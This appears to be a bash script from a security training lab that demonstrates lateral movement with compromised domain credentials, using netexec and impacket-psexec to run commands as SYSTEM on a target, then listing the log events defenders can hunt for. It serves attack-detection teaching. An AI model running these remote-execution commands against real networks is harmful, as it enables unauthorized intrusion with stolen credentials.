#!/usr/bin/env bash
# Lab 05 — Lateral movement / remote code execution with compromised creds.
# MITRE ATT&CK: T1021.002 (SMB/Admin shares), T1569.002 (Service Execution), T1078.002
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${HERE}/../lib/common.sh"

echo "== Lab 05: Lateral movement =="
warn "Use the privileged creds you discovered earlier (the planted 'helpdesk'"
warn "Domain Admin, or any admin). Target defaults to the client (${CLIENT_IP})."
: "${TARGET_IP:=$CLIENT_IP}"
confirm_lab
need_creds
ensure_impacket || exit 1

step "Validate the creds give admin on the target (T1078.002)"
if have netexec; then
  netexec smb "$TARGET_IP" -u "$LAB_USER" -p "$LAB_PASS" -d "$DOMAIN" || true
else
  say "(Optional 'netexec' not installed — skipping the pre-check, going straight to exec.)"
fi

step "Remote code execution via SMB + a temporary service (T1569.002 / T1021.002)"
say "impacket-psexec creates a service on the target that runs your command as SYSTEM."
say "Running 'whoami /priv' remotely to prove code execution:"
impacket-psexec "${DOMAIN}/${LAB_USER}:${LAB_PASS}@${TARGET_IP}" 'cmd /c whoami /priv' \
  || warn "psexec failed (target may be the DC, or WinRM/SMB blocked). Try TARGET_IP=${CLIENT_IP}."

cat <<EOF

${C_G}Quieter alternatives to try (and detect):${C_0}
  impacket-wmiexec  ${DOMAIN}/${LAB_USER}:***@${TARGET_IP}   # WMI, no new service (T1047)
  impacket-smbexec  ${DOMAIN}/${LAB_USER}:***@${TARGET_IP}   # service, different artifacts
Compare what each one leaves in the logs — that's the whole exercise.
EOF

hunt "In Wazuh (agents soc-win11 / soc-dc01): psexec is loud — 7045 (service installed, often a random name), 4697 (service installed, security log), 4624 type 3, and Sysmon process-creation for the service binary + cmd. wmiexec instead shows WmiPrvSE spawning cmd (Sysmon ID 1) with no 7045. See 05-lateral-movement/DETECTION.md."
ok "Lab 05 complete."
